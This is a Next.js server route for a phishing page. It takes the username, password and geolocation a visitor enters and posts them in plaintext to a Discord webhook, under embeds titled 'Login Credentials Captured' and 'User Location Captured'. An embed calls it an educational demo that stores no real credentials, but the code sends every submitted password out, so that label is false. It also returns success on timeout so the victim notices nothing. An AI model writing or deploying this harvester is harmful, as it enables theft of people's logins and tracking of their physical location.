import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, username, password, latitude, longitude, mapUrl } = body

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL

    if (!webhookUrl) {
      console.error('DISCORD_WEBHOOK_URL is not set')
      return NextResponse.json(
        { error: 'Discord webhook URL not configured' },
        { status: 500 }
      )
    }

    let message = ''
    let embed = null

    if (type === 'location') {
      message = '📍 **Location Accessed**'
      embed = {
        title: 'User Location Captured',
        description: 'A user granted location access on the phishing demo page',
        color: 0xff0000,
        fields: [
          {
            name: 'Coordinates',
            value: `Latitude: ${latitude}\nLongitude: ${longitude}`,
            inline: false,
          },
          {
            name: 'Google Maps Link',
            value: `[View on Google Maps](${mapUrl})`,
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
      }
    } else if (type === 'credentials') {
      message = '🔐 **Login Credentials Captured**'
      embed = {
        title: 'Phishing Demo - Credentials Submitted',
        description: '⚠️ **EDUCATIONAL DEMO ONLY - NO REAL CREDENTIALS STORED**',
        color: 0xff9900,
        fields: [
          {
            name: 'Username',
            value: username || 'Not provided',
            inline: true,
          },
          {
            name: 'Password',
            value: password || 'Not provided',
            inline: true,
          },
        ],
        timestamp: new Date().toISOString(),
      }

      if (latitude && longitude) {
        embed.fields.push({
          name: 'Location',
          value: `[${latitude}, ${longitude}](${mapUrl})`,
          inline: false,
        })
      }
    }

    const payload = {
      content: message,
      embeds: embed ? [embed] : [],
    }

    // Use AbortController with timeout for faster failure on slow connections
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 10000) // 10 second timeout

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
        signal: controller.signal,
      })

      clearTimeout(timeoutId)

      if (!response.ok) {
        const errorText = await response.text()
        console.error('Discord webhook failed:', response.status, errorText)
        return NextResponse.json(
          { error: 'Failed to send message to Discord' },
          { status: response.status }
        )
      }

      return NextResponse.json({ success: true })
    } catch (error: any) {
      clearTimeout(timeoutId)
      if (error.name === 'AbortError') {
        console.error('Discord webhook request timed out')
        // Still return success to not block the client
        return NextResponse.json({ success: true, timeout: true })
      }
      throw error
    }
  } catch (error) {
    console.error('Error in Discord API route:', error)
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}

